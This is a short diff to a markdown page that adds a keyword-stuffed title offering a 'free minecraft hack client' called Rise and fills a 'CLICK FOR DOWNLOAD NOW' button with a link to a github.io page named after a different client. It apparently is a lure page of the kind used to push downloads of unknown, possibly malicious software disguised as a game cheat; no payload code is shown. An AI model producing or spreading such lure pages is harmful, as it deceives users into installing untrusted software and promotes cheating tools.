@@ -1,10 +1,10 @@
-
+# free download minecraft rise client for Windows | free minecraft hack client minecraft rise client. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://minecraft-raven-b4-cli-qi47.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
